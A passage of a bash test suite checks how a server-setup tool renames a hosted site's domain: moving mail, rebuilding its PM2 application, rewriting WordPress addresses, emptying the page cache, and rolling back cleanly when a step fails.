printf '%s\n' 'info@beta.example:{H}taken::::::userdb_quota_rule=*:storage=1G' >>"$_rn/mail/passwd"
_rn_case _rn_rename alpha.example beta.example
_p="$(cat "$_rn/mail/passwd")"
assert_has   "an address that is taken at the new domain is said" "info@alpha.example stays a mailbox at alpha.example: info@beta.example exists already" "$(_rn_out)"
assert_has   "that mailbox stays one of the old domain" 'info@alpha.example:{H}infohash' "$_p"
assert_has   "the one at the new domain is not written over" 'info@beta.example:{H}taken' "$_p"
assert_true  "its mail stays" test -s "$_rn/vmail/alpha.example/info/Maildir/new/m1"
assert_eq    "it is not made an alias" "" "$(_rn_alias alpha.example info@alpha.example)"
assert_has   "the others move" 'sales@beta.example:{H}saleshash' "$_p"
assert_eq    "an alias names each target where it is now" "info@alpha.example,sales@beta.example,boss@elsewhere.example" "$(_rn_alias beta.example team@beta.example)"
# mail of somebody else's lies where a mailbox would go: that mailbox stays too
_rn_mail_boxes
mkdir -p "$_rn/vmail/beta.example/sales/Maildir"
_rn_case _rn_rename alpha.example beta.example
assert_has   "a directory in the way at the new domain is said" "sales@alpha.example stays a mailbox at alpha.example: $_rn/vmail/beta.example/sales is in the way" "$(_rn_out)"
assert_has   "and that mailbox keeps its line" 'sales@alpha.example:{H}saleshash' "$(cat "$_rn/mail/passwd")"
assert_true  "and its mail directory" test -d "$_rn/vmail/alpha.example/sales/Maildir/cur"
# somebody already signed in to the webmail under the new address: that user is not written over
_rn_mail_boxes
printf 'info@alpha.example\ninfo@beta.example\n' >"$_rn/wm-users"
_rn_case _rn_rename alpha.example beta.example
assert_lacks "a webmail user that exists under the new name is left alone" "sql UPDATE" "$(_rn_calls)"
# mail cannot be switched on for the new name: nothing moves
_rn_mail_boxes
: >"$_rn/mail-enable-fails"
_rn_before_pw="$(cat "$_rn/mail/passwd")"; _rn_before_al="$(cat "$_rn/mail/aliases/alpha.example")"
_rn_case _rn_rename alpha.example beta.example
assert_has   "the rename itself is not undone by it" "Renamed alpha.example to beta.example" "$(_rn_out)"
assert_has   "it is said that the mailboxes stayed" "The mailboxes could not be moved to @beta.example" "$(_rn_out)"
assert_eq    "no mailbox line changed" "$_rn_before_pw" "$(cat "$_rn/mail/passwd")"
assert_eq    "no alias" "$_rn_before_al" "$(cat "$_rn/mail/aliases/alpha.example")"
assert_true  "no mail moved" test -s "$_rn/vmail/alpha.example/info/Maildir/new/m1"
assert_true  "and the old domain still has its mail, as a mail domain" test -s "$_rn/maildomains/alpha.example/domain.json"
# mail that is switched off is not moved: it is parked, not in use
_rn_mail_boxes
jq '.mail.enabled = false' "$_rn/state/domains/alpha.example/domain.json" >"$_rn/t" && cp "$_rn/t" "$_rn/state/domains/alpha.example/domain.json"
_rn_case _rn_rename alpha.example beta.example
assert_lacks "mail that is switched off stays where it is" "mail-enable" "$(_rn_calls)"
assert_has   "and that is what is said beforehand" "stays at @alpha.example" "$(_rn_out)"
# --keep-mail with mailboxes
_rn_mail_boxes
_rn_before_pw="$(cat "$_rn/mail/passwd")"
_rn_case _rn_rename alpha.example beta.example --keep-mail
assert_eq    "--keep-mail leaves every mailbox line as it is" "$_rn_before_pw" "$(cat "$_rn/mail/passwd")"
assert_true  "and the mail" test -s "$_rn/vmail/alpha.example/info/Maildir/new/m1"
# a message that arrived under the old name in between
_rn_mail_boxes
mkdir -p "$_rn/vmail/beta.example/info/Maildir/new"
printf 'late\n' >"$_rn/vmail/alpha.example/info/Maildir/new/late"
_rn_case _domain_rename_box_sweep info@alpha.example beta.example
assert_true  "a message delivered to the old mailbox during the move goes on to the new one" test -s "$_rn/vmail/beta.example/info/Maildir/new/late"
assert_false "and the directory made for it goes" test -e "$_rn/vmail/alpha.example/info"
mkdir -p "$_rn/vmail/alpha.example/sales/Maildir/new"; printf 'x\n' >"$_rn/vmail/alpha.example/sales/Maildir/new/keep"
_rn_case _domain_rename_box_sweep sales@alpha.example beta.example
assert_true  "with nowhere to put it, a message is left where it is" test -s "$_rn/vmail/alpha.example/sales/Maildir/new/keep"
_rn_case _domain_rename_mail_targets "a@old.example, b@old.example,c@old.example,x@other.example" old.example new.example "a@old.example
c@old.example"
assert_eq    "targets: what moved is named at the new domain, what did not is not" "a@new.example,b@old.example,c@new.example,x@other.examplerc=0" "$(_rn_out)"

# ---- rename: a site with a Node.js application ----------------------------------------
# The PM2 service is named after the user and runs out of the home. It is taken down before
# either changes and set up again afterwards, the way a restore does it.
_rn_app_site() {
  _rn_fresh
  jq '.mode = "proxy" | .php = {} | .proxy = {target: "127.0.0.1:3000", static_paths: "none"} | .app = {manager: "pm2", port: 3000, start: "npm start", enabled: true}
      | .workers = [{name: "queue", start: "node queue.js", cron: "*/5 * * * *"}]' \
    "$_rn/state/domains/alpha.example/domain.json" >"$_rn/t" && cp "$_rn/t" "$_rn/state/domains/alpha.example/domain.json"
  printf '{"APP_URL":"https://alpha.example"}\n' >"$_rn/state/domains/alpha.example/app-env.json"
  printf '%s\n' "*/5 * * * * alpha_example /bin/bash $_rn/home/alpha.example/.pm2/jobs/queue.sh # server-setup:job:alpha.example:queue" >>"$_rn/cron"
  mkdir -p "$_rn/home/alpha.example/.pm2" "$_rn/home/alpha.example/app"
  : >"$_rn/home/alpha.example/.pm2/dump.pm2"; : >"$_rn/home/alpha.example/.pm2/pm2.pid"; printf '{}' >"$_rn/home/alpha.example/.pm2/lomp.ecosystem.json"
}
_rn_app_site
_rn_case _rn_rename_dry alpha.example beta.example
assert_has   "it is said beforehand that the application is built again" "its PM2 service is set up again under the new user" "$(_rn_out)"
_rn_case _rn_rename alpha.example beta.example
_o="$(_rn_out)"; _c="$(_rn_calls)"
assert_has   "a site with an application is renamed" "rc=0" "$_o"
assert_has   "no deploy may be running: its lock is taken" "app-lock alpha.example" "$_c"
assert_has   "the PM2 service of the old user is taken down" "app-teardown alpha_example" "$_c"
assert_has   "and set up for the new user in the new home" "app-restore beta_example home=$_rn/home/beta.example" "$_c"
assert_eq    "down before the user is renamed; up after the site and the redirect, before the certificate" "in order" \
  "$(awk '/^app-teardown/{t=NR} /^usermod -l/{u=NR} /^apply beta.example/{a=NR} /^redirect-apply alpha.example/{r=NR} /^app-restore/{s=NR} /^add-ssl/{c=NR}
          END{ if (t && u && a && r && s && c && t < u && u < a && a < r && r < s && s < c) print "in order"; else print t, u, a, r, s, c }' "$_rn/calls")"
assert_lacks "the scheduled job of the old name is out of cron" "job:alpha.example" "$(cat "$_rn/cron")"
assert_false "PM2's saved list, which names the old paths, is gone" test -e "$_rn/home/beta.example/.pm2/dump.pm2"
assert_false "and its pid file" test -e "$_rn/home/beta.example/.pm2/pm2.pid"
assert_true  "what lomp starts it from is still there" test -e "$_rn/home/beta.example/.pm2/lomp.ecosystem.json"
assert_eq    "the application's settings follow the site" "3000 npm start queue" "$(_rn_json beta.example '"\(.app.port) \(.app.start) \(.workers[0].name)"')"
assert_true  "and its variables" test -s "$_rn/state/domains/beta.example/app-env.json"
assert_has   "a variable that still names the old domain is pointed out" "A variable of the application still names alpha.example" "$_o"
assert_has   "it has a step of its own" "Node.js application" "$_o"
assert_lacks "no PHP is asked for on a proxy site" "PHP is not executing" "$_o"
_rn_app_site
: >"$_rn/app-fails"
_rn_case _rn_rename alpha.example beta.example
assert_has   "an application that does not come up does not undo the rename" "rc=0" "$(_rn_out)"
assert_has   "it is said, with the command for later" "setup.sh app deploy beta.example" "$(_rn_out)"
_rn_app_site
: >"$_rn/smoke-fails"
_rn_case _rn_rename alpha.example beta.example
_c="$(_rn_calls)"
assert_has   "a failed rename of a site with an application rolls back" "Rolling back" "$(_rn_out)"
assert_has   "its PM2 service is put back for the old user" "app-apply alpha_example" "$_c"
assert_has   "and its scheduled jobs" "app-jobs alpha.example" "$_c"
assert_lacks "nothing was built under the new name" "app-restore" "$_c"
assert_true  "after the old virtual host" bash -c 'a="$(grep -n "^apply alpha.example" "$1" | tail -n 1 | cut -d: -f1)"; b="$(grep -n "^app-apply" "$1" | cut -d: -f1)"; [ "$a" -lt "$b" ]' _ "$_rn/calls"
_rn_fresh
: >"$_rn/smoke-fails"
_rn_case _rn_rename alpha.example beta.example
assert_lacks "a site without an application gets none on the way back" "app-" "$(_rn_calls)"
_rn_fresh
: >"$_rn/redirect-fails"
_rn_case _rn_rename alpha.example beta.example
assert_has   "a redirect that cannot be set up does not undo the rename" "rc=0" "$(_rn_out)"
assert_has   "it is said, with the command for later" "setup.sh redirect add alpha.example beta.example --www" "$(_rn_out)"
assert_true  "the site is under its new name" test -s "$_rn/state/domains/beta.example/domain.json"
_rn_fresh
_rn_site "${_rn_long}.example" "$(lib_domain_ident "${_rn_long}.example")"
: >"$_rn/calls"
_rn_case _rn_rename "${_rn_long}.example" "${_rn_long}.exampleb"
assert_has   "two names with one user name: the rename succeeds" "rc=0" "$(_rn_out)"
assert_lacks "and renames no user" "usermod -l" "$(_rn_calls)"
assert_lacks "nor a group" "groupmod" "$(_rn_calls)"
assert_has   "but points it at the new home" "usermod -d $_rn/home/${_rn_long}.exampleb" "$(_rn_calls)"

# ---- rename: a failure half way puts the site back ------------------------------------
for _rn_fail in usermod-d-fails apply-fails smoke-fails php-fails; do
  _rn_fresh
  _rn_before="$(_rn_tree)"; _rn_state_before="$(jq -S 'del(.updated_at)' "$_rn/state/domains/alpha.example/domain.json")"
  : >"$_rn/$_rn_fail"
  _rn_case _rn_rename alpha.example beta.example
  assert_has   "${_rn_fail}: the rename fails" "rc=1" "$(_rn_out)"
  assert_has   "${_rn_fail}: and rolls back" "Rolling back" "$(_rn_out)"
  assert_eq    "${_rn_fail}: every directory is where it was" "$(grep -v '^phpini' <<<"$_rn_before")" "$(_rn_tree | grep -v '^phpini')"
  assert_eq    "${_rn_fail}: the state is what it was" "$_rn_state_before" "$(jq -S 'del(.updated_at)' "$_rn/state/domains/alpha.example/domain.json")"
  assert_eq    "${_rn_fail}: the user has its old name" "root alpha_example" "$(tr '\n' ' ' <"$_rn/users" | sed 's/ $//')"
  assert_eq    "${_rn_fail}: the group too" "root alpha_example" "$(tr '\n' ' ' <"$_rn/groups" | sed 's/ $//')"
  assert_has   "${_rn_fail}: it is pointed back at its home" "usermod -d $_rn/home/alpha.example -c site alpha.example alpha_example" "$(_rn_calls | tail -n 8)"
  assert_has   "${_rn_fail}: the old virtual host is applied again, with its certificate" "apply alpha.example user=alpha_example home=$_rn/home/alpha.example ssl=1" "$(_rn_calls | tail -n 6)"
  assert_has   "${_rn_fail}: the scheduled events are back" "alpha_example cd $_rn/home/alpha.example/public_html" "$(grep 'wpcron:alpha.example' "$_rn/cron")"
  if [[ "$_rn_fail" == smoke-fails || "$_rn_fail" == php-fails ]]; then
    assert_has "${_rn_fail}: the virtual host of the new name is taken out of the configuration" "purge beta.example 0" "$(_rn_calls)"
  fi
  assert_false "${_rn_fail}: no redirect was left" test -e "$_rn/state/domains/alpha.example/redirect.json"
  assert_false "${_rn_fail}: no virtual host directory under the new name" test -e "$_rn/lsws/conf/vhosts/beta.example"
  rm -f "$_rn/$_rn_fail"
  _rn_case _rn_rename alpha.example beta.example
  assert_has   "${_rn_fail}: and the same rename then goes through" "rc=0" "$(_rn_out)"
done

# ---- rename: the pages a WordPress had cached on the way --------------------------------
# OpenLiteSpeed keeps the pages a WordPress site answers with. The first page under the new
# name is asked for by rename itself, when it looks whether the site answers - before the
# addresses in the database are rewritten. That page says the old name on every link, and it
# was what visitors were given from then on, for as long as the cache kept it.
_rn_rename_cached() {   # the rename, with a page cache that keeps what the site is asked for
  _rn_flow
  eval 'lib_ols_smoke_test() {
          printf "smoke %s\n" "$*" >>"$_rn/calls"
          if [[ -d "$OLS_CACHE_DIR/$1" ]]; then mkdir -p "$OLS_CACHE_DIR/$1/0/a"; printf "the front page, as the database said it then\n" >"$OLS_CACHE_DIR/$1/0/a/page"; fi
          return 0
        }'
  lib_domain_rename_main "$@"
}
_rn_cached_site() {
  _rn_fresh
  jq '.mode = "wordpress"' "$_rn/state/domains/alpha.example/domain.json" >"$_rn/t" && cp "$_rn/t" "$_rn/state/domains/alpha.example/domain.json"
  printf '<?php // wp\n' >"$_rn/home/alpha.example/public_html/wp-config.php"
  mkdir -p "$_rn/lsws/cachedata/alpha.example"; printf 'a page of the old name\n' >"$_rn/lsws/cachedata/alpha.example/page"
  cat >"$_rn/wp" <<'EOF'
#!/bin/sh
# wp-cli, standing in: somebody asks for a page while the addresses are being rewritten
d="$(dirname "$0")"
printf 'wp %s\n' "$*" >>"$d/calls"
case "$*" in *search-replace*) [ ! -d "$d/lsws/cachedata/beta.example" ] || : >"$d/lsws/cachedata/beta.example/asked-for-during-the-rewrite" ;; esac
exit 0
EOF
  chmod +x "$_rn/wp"
}
_rn_cached_site
_rn_case _rn_rename_cached alpha.example beta.example
_o="$(_rn_out)"
assert_has   "a WordPress whose pages are cached is renamed" "rc=0" "$_o"
assert_has   "it was asked whether it answers, which is when the first page was cached" "smoke beta.example" "$(_rn_calls)"
assert_true  "its page cache is there under the new name" test -d "$_rn/lsws/cachedata/beta.example"
assert_eq    "and holds no page from before the addresses were rewritten, nor from while they were" "" "$(find "$_rn/lsws/cachedata/beta.example" -mindepth 1 | sort | tr '\n' ' ')"
assert_has   "which is said" "page cache emptied" "$_o"
assert_false "the cache of the old name went with the name" test -e "$_rn/lsws/cachedata/alpha.example"
_rn_cached_site
_rn_case _rn_rename_cached alpha.example beta.example --no-search-replace
assert_true  "--no-search-replace: the pages say what the database still says, and stay" test -s "$_rn/lsws/cachedata/beta.example/0/a/page"
assert_lacks "and nothing is said about a cache" "page cache" "$(_rn_out)"
unset -f _rn_rename_cached _rn_cached_site

# ---- rename: a site whose name is no domain name --------------------------------------
# "restore" registered a site under whatever name it was given until 1.0.87: "shop_old",
# "staging". Such a site is a site, and this is how it gets its domain name. Its record says
# the user of the site its archive was made of, and its WordPress says that site's address.
# The name it is registered under is nothing anybody could ask this server for: no redirect
# is left under it, and it was never an address - as a pattern, "//staging" is also how
# "//staging.example.com" begins.
_rn_odd_site() {   # [name] -> a fresh tree, with a site in it as the old restore left one
  local n="${1:-shop_old}"
  _rn_fresh
  _rn_site "$n" shop_example
  jq '.ssl.enabled = false | del(.ssl.expires) | del(.ssl.cert_name)' "$_rn/state/domains/$n/domain.json" >"$_rn/t" && cp "$_rn/t" "$_rn/state/domains/$n/domain.json"
  rm -rf "$_rn/ssl/$n" "$_rn/state/domains/$n/ssl.info" "$_rn/covers-$n"
  cat >"$_rn/wp" <<'EOF'
#!/bin/sh
# wp-cli, standing in. It says what WordPress gives as its address, and gives the new name
# once the bare address has been rewritten - unless that name is pinned outside the database.
d="$(dirname "$0")"
printf 'wp %s\n' "$*" >>"$d/calls"
case "$*" in
  *"option get siteurl"*) [ ! -e "$d/wp-deaf" ] || exit 1; cat "$d/wp-siteurl" 2>/dev/null ;;
  *"option get home"*)    [ ! -e "$d/wp-deaf" ] || exit 1; cat "$d/wp-home" 2>/dev/null ;;
  *"search-replace "*)    [ ! -e "$d/wp-sr-fails" ] || exit 1
                          case "$3" in
                            //www.*) ;;
                            //*)     [ -e "$d/wp-pinned" ] || { printf 'https://%s\n' "${4#//}" >"$d/wp-siteurl"; cp "$d/wp-siteurl" "$d/wp-home"; } ;;
                          esac ;;
esac
exit 0
EOF
  chmod +x "$_rn/wp"
}
_rn_odd_wp() {   # a WordPress in shop_old: what it gives as "siteurl", and as "home" (the same when left out)
  printf '<?php // wp\n' >"$_rn/home/shop_old/public_html/wp-config.php"
  printf '%s\n' "$1" >"$_rn/wp-siteurl"; printf '%s\n' "${2:-$1}" >"$_rn/wp-home"
}
_rn_said() { lib_domain_state_load "$1"; _domain_rename_wp_said; }

# the arguments
_rn_odd_site
_rn_before="$(_rn_tree)"
_rn_case _rn_rename shop_new beta.example;            assert_has "a name of that kind which no site has is not taken" "Invalid domain name 'shop_new'" "$(_rn_out)"
_rn_case _rn_rename ../domains/shop_old beta.example; assert_has "nor a path that ends at the site" "Invalid domain name '../domains/shop_old'" "$(_rn_out)"
_rn_case _rn_rename shop_old/ beta.example;           assert_has "nor its name with a slash after it" "Invalid domain name 'shop_old/'" "$(_rn_out)"
_rn_case _rn_rename shop_old shop_new;                assert_has "what it becomes has to be a domain name" "Invalid domain name 'shop_new'" "$(_rn_out)"
_rn_case _rn_rename alpha.example shop_old;           assert_has "and no site moves to a name of that kind, taken or not" "Invalid domain name 'shop_old'" "$(_rn_out)"
_rn_case _rn_rename_dry shop_old beta.example
_o="$(_rn_out)"
assert_has   "a dry run says what would happen to the site" "becomes $_rn/home/beta.example" "$_o"
assert_has   "that the user on its record is the one renamed" "the Linux user shop_example becomes beta_example" "$_o"
assert_has   "and that nothing stays behind under a name that is none" "shop_old  is no domain name" "$_o"
assert_lacks "no redirect is promised" "stays as a redirect" "$_o"
assert_lacks "and no certificate is said to be deleted" "its certificate is deleted" "$_o"
assert_has   "nor anything else done" "nothing was changed" "$_o"
assert_eq    "after all of these the site is where it was" "$_rn_before" "$(_rn_tree)"
assert_lacks "and nobody was renamed" "usermod" "$(_rn_calls)"

# the move, to a name that is not the one its WordPress says
_rn_odd_site
_rn_odd_wp 'https://WWW.Shop.Example/wp' 'http://shop.example:8080/?p=1'
printf "define('WP_ENVIRONMENT_TYPE', 'shop_old');\n" >>"$_rn/home/shop_old/public_html/wp-config.php"
printf 'php_value error_log %s/home/shop_old/private/php.log\n' "$_rn" >"$_rn/home/shop_old/public_html/.htaccess"
printf 'open_basedir = "%s/home/shop_old"\n' "$_rn" >"$_rn/home/shop_old/public_html/.user.ini"
printf 'WP_URL=https://shop.example\nWP_PATH=%s/home/shop.example/public_html\n' "$_rn" >"$_rn/state/domains/shop_old/wp.info"
printf '%s\n' "*/5 * * * * shop_example cd $_rn/home/shop_old/public_html && wp cron # server-setup:wpcron:shop_old" >>"$_rn/cron"
_rn_case _rn_rename shop_old beta.example
_o="$(_rn_out)"; _c="$(_rn_calls)"
assert_has   "a site under a name that is no domain name is renamed" "rc=0" "$_o"
assert_has   "and it says so" "Renamed shop_old to beta.example" "$_o"
assert_true  "its home has the new name" test -s "$_rn/home/beta.example/public_html/index.php"
assert_false "and not the old one" test -e "$_rn/home/shop_old"
assert_true  "its logs moved" test -s "$_rn/sitelogs/beta.example/access.log"
assert_eq    "the state says who the site is now, and what it was called" "beta.example beta_example beta_example beta_example $_rn/home/beta.example shop_old" \
  "$(_rn_json beta.example '"\(.domain) \(.ident) \(.user) \(.group) \(.home) \(.renamed_from)"')"
assert_has   "the user that is renamed is the one on its record" "usermod -l beta_example shop_example" "$_c"
assert_has   "the group too" "groupmod -n beta_example shop_example" "$_c"
assert_lacks "nobody called after the name it had is looked for" "shop_old" "$(grep -E '^(usermod|groupmod) ' <<<"$_c" || true)"
assert_has   "a safety backup comes first, by the name it has" "backup shop_old --tag pre-rename --keep 0 --no-mail" "$(head -n 1 "$_rn/calls")"
assert_true  "the archives follow the site" test -e "$_rn/backups/beta.example/shop_old-pre-rename-20260101-000000.tar.gz"
assert_has   "the scheduled events run as the new user in the new home" "beta_example cd $_rn/home/beta.example/public_html" "$(grep 'wpcron:beta.example' "$_rn/cron" || true)"
assert_lacks "and no line is left for the old name" "shop_old" "$(cat "$_rn/cron")"
# the old name
assert_false "nothing is left under the old name: no record of any kind" test -e "$_rn/state/domains/shop_old"
assert_lacks "no redirect is set up for a name nothing can ask for" "redirect-apply" "$_c"
assert_lacks "and no certificate is looked for under it: one of that name would be somebody else's" "ssl-delete" "$_c"
assert_has   "that is said" "nothing is left under shop_old" "$_o"
assert_has   "and again at the end" "shop_old (no domain name: nothing is left under it)" "$_o"
assert_lacks "nobody is told to keep its DNS" "Keep the DNS of shop_old" "$_o"
_rn_case lib_redirects_list
assert_eq    "the redirects on record are as many as before: none" "rc=0" "$(_rn_out)"
# what its WordPress said
assert_has   "WordPress is asked which address it has" "option get siteurl" "$_c"
assert_has   "the addresses of that name are rewritten, www first" "search-replace //www.shop.example //www.beta.example --all-tables-with-prefix --skip-columns=guid" "$_c"
assert_has   "the bare name" "search-replace //shop.example //beta.example " "$_c"
assert_has   "the form JSON keeps them in" 'search-replace \/\/shop.example \/\/beta.example ' "$_c"
assert_has   "the home a site of that name has" "search-replace $_rn/home/shop.example/ $_rn/home/beta.example/ " "$_c"
assert_has   "and the home this site had" "search-replace $_rn/home/shop_old/ $_rn/home/beta.example/ " "$_c"
assert_lacks "never the name it was registered under: it was no address" "search-replace //shop_old" "$_c"
assert_lacks "with www or without" "www.shop_old" "$_c"
assert_lacks "in neither form" 'search-replace \/\/shop_old' "$_c"
assert_has   "it runs as the renamed user" "-u beta_example -- env HOME=$_rn/home/beta.example" "$(grep 'search-replace' "$_rn/runuser.log" | tail -n 1)"
assert_has   "it is said which name the database gave" "its database said shop.example; the addresses in it now say beta.example" "$_o"
assert_eq    "the note with the admin login follows, from that name" "WP_URL=https://beta.example WP_PATH=$_rn/home/beta.example/public_html" "$(tr '\n' ' ' <"$_rn/state/domains/beta.example/wp.info" | sed 's/ $//')"
# what still names it
assert_has   "a file that still names the home it had is pointed out" "$_rn/home/beta.example/public_html/.htaccess" "$_o"
assert_has   "one that names it with nothing after it too" "$_rn/home/beta.example/public_html/.user.ini" "$_o"
assert_lacks "one that only has the word in it is not: of a name that may be any word, the path is looked for" "$_rn/home/beta.example/public_html/wp-config.php" "$_o"
assert_has   "and the files are called what they are" "These files still name the old path $_rn/home/shop_old; have a look at them" "$_o"

# back to the name its user is called after, which is the one its WordPress says
_rn_odd_site
_rn_odd_wp 'https://shop.example'
_rn_case _rn_rename_dry shop_old shop.example
assert_has   "a user that is called after the new name already is said to keep its name" "the Linux user shop_example keeps its name" "$(_rn_out)"
_rn_case _rn_rename shop_old shop.example
_o="$(_rn_out)"; _c="$(_rn_calls)"
assert_has   "that rename succeeds" "rc=0" "$_o"
assert_lacks "and renames no user" "usermod -l" "$_c"
assert_lacks "nor a group" "groupmod" "$_c"
assert_has   "but points the user at the new home" "usermod -d $_rn/home/shop.example -c site shop.example shop_example" "$_c"
assert_lacks "a database that gives the new name already has no address rewritten" "search-replace //" "$_c"
assert_lacks "in neither form" 'search-replace \/\/' "$_c"
assert_has   "only the home the site had" "search-replace $_rn/home/shop_old/ $_rn/home/shop.example/ " "$_c"
assert_has   "which is said" "its database gives shop.example as its address already" "$_o"

# a WordPress that does not say
_rn_odd_site
_rn_odd_wp 'https://shop.example'; : >"$_rn/wp-deaf"
_rn_case _rn_rename shop_old beta.example
_o="$(_rn_out)"; _c="$(_rn_calls)"
assert_has   "a WordPress that cannot be asked does not stop the rename" "rc=0" "$_o"
assert_lacks "and no address is rewritten on a guess" "search-replace //" "$_c"
assert_lacks "in neither form" 'search-replace \/\/' "$_c"
assert_has   "the home the site had still is" "search-replace $_rn/home/shop_old/ $_rn/home/beta.example/ " "$_c"
assert_has   "it is said that no address was" "WordPress did not say which address it has" "$_o"
assert_has   "with what to run once the name is known" "wp search-replace '//that-name' '//beta.example'" "$_o"
# one whose name is set outside its database
_rn_odd_site
_rn_odd_wp 'https://shop.example'; : >"$_rn/wp-pinned"
_rn_case _rn_rename shop_old beta.example
assert_has   "a name the rewrite did not reach is not called rewritten" "WordPress does not give beta.example as its address" "$(_rn_out)"
assert_has   "it is said where such a name is set" "WP_HOME and WP_SITEURL in $_rn/home/beta.example/public_html/wp-config.php" "$(_rn_out)"
assert_lacks "and nothing claims that the database now says the new name" "the addresses in it now say" "$(_rn_out)"
# a rewrite that fails
_rn_odd_site
_rn_odd_wp 'https://shop.example'; : >"$_rn/wp-sr-fails"
_rn_case _rn_rename shop_old beta.example
assert_has   "a rewrite that failed is named for doing again, by the name the database gave" "Again: wp search-replace '//shop.example' '//beta.example'" "$(_rn_out)"
_rn_odd_site
_rn_odd_wp 'https://beta.example'; : >"$_rn/wp-sr-fails"
_rn_case _rn_rename shop_old beta.example
assert_has   "where only the home was to be rewritten, by the home" "Again: wp search-replace '$_rn/home/shop_old/' '$_rn/home/beta.example/'" "$(_rn_out)"
# --no-search-replace, and no wp-cli
_rn_odd_site
_rn_odd_wp 'https://shop.example'
_rn_case _rn_rename shop_old beta.example --no-search-replace
assert_lacks "--no-search-replace: WordPress is not even asked" "option get" "$(_rn_calls)"
assert_lacks "and nothing in its database is rewritten" "search-replace" "$(_rn_calls)"
if (( CAN_CHMOD )); then
  _rn_odd_site
  _rn_odd_wp 'https://shop.example'; chmod -x "$_rn/wp"
  _rn_case _rn_rename shop_old beta.example
  assert_has   "without wp-cli it says that the database was not looked at" "the WordPress database was not looked at" "$(_rn_out)"
  assert_lacks "and suggests no rewrite from a name that never was an address" "//shop_old" "$(_rn_out)"
  _rn_fresh
  printf '<?php // wp\n' >"$_rn/home/alpha.example/public_html/wp-config.php"; chmod -x "$_rn/wp"
  _rn_case _rn_rename alpha.example beta.example
  assert_has   "for a site whose name is one, it is the old name that the database still says" "the WordPress database still says alpha.example" "$(_rn_out)"
  assert_has   "and the old name that is to be rewritten" "Later: wp search-replace '//alpha.example' '//beta.example'" "$(_rn_out)"
fi

# the name WordPress gives
_rn_odd_site
_rn_odd_wp 'https://WWW.Shop.Example/wp' 'http://shop.example:8080/?p=1'
_rn_case _rn_said shop_old;  assert_eq "the name WordPress gives: no scheme, no www, no port, no path, in lower case" "shop.examplerc=0" "$(_rn_out)"
_rn_odd_wp 'https://shop.example' 'https://other.example'
_rn_case _rn_said shop_old;  assert_eq "two names are no answer" "rc=0" "$(_rn_out)"
_rn_odd_wp 'http://localhost:8080'
_rn_case _rn_said shop_old;  assert_eq "nor is a host that is no domain name" "rc=0" "$(_rn_out)"
_rn_odd_wp 'http://192.0.2.7'
_rn_case _rn_said shop_old;  assert_eq "nor an address in numbers" "rc=0" "$(_rn_out)"
_rn_odd_wp ''
_rn_case _rn_said shop_old;  assert_eq "nor silence" "rc=0" "$(_rn_out)"
_rn_odd_wp 'https://shop.example'; : >"$_rn/wp-deaf"
_rn_case _rn_said shop_old;  assert_eq "nor a WordPress that cannot be asked" "rc=0" "$(_rn_out)"
# and the pairs that come of it
_rn_case _domain_rename_wp_pairs staging staging.example 1
assert_eq "a name that is no domain name has no address to rewrite: its home, and that is all" "$_rn/home/staging/>$_rn/home/staging.example/|rc=0" "$(_rn_out | tr '\t\n' '>|' | sed 's/|$//')"
_rn_case _domain_rename_wp_pairs staging b.example 1 a.example
assert_eq "with the name WordPress gave: that name's addresses and home, then the home the site had" \
  "//www.a.example>//www.b.example|//a.example>//b.example|\\/\\/www.a.example>\\/\\/www.b.example|\\/\\/a.example>\\/\\/b.example|$_rn/home/a.example/>$_rn/home/b.example/|$_rn/home/staging/>$_rn/home/b.example/|rc=0" "$(_rn_out | tr '\t\n' '>|' | sed 's/|$//')"
_rn_case _domain_rename_wp_pairs staging b.example 1 b.example
assert_eq "none where that is the new name already" "$_rn/home/staging/>$_rn/home/b.example/|rc=0" "$(_rn_out | tr '\t\n' '>|' | sed 's/|$//')"
_rn_case _domain_rename_wp_pairs staging b.example 1 localhost
assert_eq "and none for what is no domain name itself" "$_rn/home/staging/>$_rn/home/b.example/|rc=0" "$(_rn_out | tr '\t\n' '>|' | sed 's/|$//')"
_rn_case _domain_rename_wp_pairs a.example b.example 1 c.example
assert_eq "a site whose name is a domain name is rewritten from that name, whatever else is handed in" \
  "//www.a.example>//www.b.example|//a.example>//b.example|\\/\\/www.a.example>\\/\\/www.b.example|\\/\\/a.example>\\/\\/b.example|$_rn/home/a.example/>$_rn/home/b.example/|rc=0" "$(_rn_out | tr '\t\n' '>|' | sed 's/|$//')"

# a failure half way puts such a site back under the name it had
_rn_odd_site
_rn_before="$(_rn_tree)"; _rn_state_before="$(jq -S 'del(.updated_at)' "$_rn/state/domains/shop_old/domain.json")"
: >"$_rn/smoke-fails"
_rn_case _rn_rename shop_old beta.example
assert_has   "a rename of such a site that fails half way rolls back" "Rolling back" "$(_rn_out)"
assert_eq    "every directory is where it was" "$(grep -v '^phpini' <<<"$_rn_before")" "$(_rn_tree | grep -v '^phpini')"
assert_eq    "the state is what it was" "$_rn_state_before" "$(jq -S 'del(.updated_at)' "$_rn/state/domains/shop_old/domain.json")"
assert_eq    "the user has the name it had" "root alpha_example shop_example" "$(tr '\n' ' ' <"$_rn/users" | sed 's/ $//')"
assert_eq    "and lives where it lived" "shop_example:$_rn/home/shop_old" "$(grep '^shop_example:' "$_rn/passwd")"
assert_has   "the virtual host is put back under the name the site has" "apply shop_old user=shop_example home=$_rn/home/shop_old ssl=0" "$(_rn_calls | tail -n 6)"
rm -f "$_rn/smoke-fails"
_rn_case _rn_rename shop_old beta.example
assert_has   "and the same rename then goes through" "rc=0" "$(_rn_out)"

# Mail it cannot have: no mail command takes a name that is no domain name. What its record
# says about mail came out of its archive, and a directory of its name in the mail store is
# nobody's. Here the question "does this name have mail" is the real one, not a stand-in.
_rn_rename_mail() {
  _rn_flow
  eval "$(sed -n '/^lib_mail_domain_has_traces() {/,/^}/p' "$ROOT/lib/mail.sh")"
  MAIL_VMAIL_HOME="$_rn/vmail"; MAIL_PASSWD_FILE="$_rn/mail-passwd"; MAIL_ALIAS_DIR="$_rn/mail-aliases"; MAIL_DISABLED_DIR="$_rn/mail-disabled"; MAIL_DKIM_DIR="$_rn/mail-dkim"
  lib_domain_rename_main "$@"
}
_rn_odd_site
jq '.mail = {enabled: true, selector: "s2026"}' "$_rn/state/domains/shop_old/domain.json" >"$_rn/t" && cp "$_rn/t" "$_rn/state/domains/shop_old/domain.json"
: >"$_rn/mail-installed"; mkdir -p "$_rn/vmail/shop_old/info/Maildir"
_rn_case _rn_rename_mail shop_old beta.example
_o="$(_rn_out)"
assert_has   "a site of that kind whose record came with a mail block is renamed" "rc=0" "$_o"
assert_lacks "nothing is said about mail that stays: such a name has none" "stays at @shop_old" "$_o"
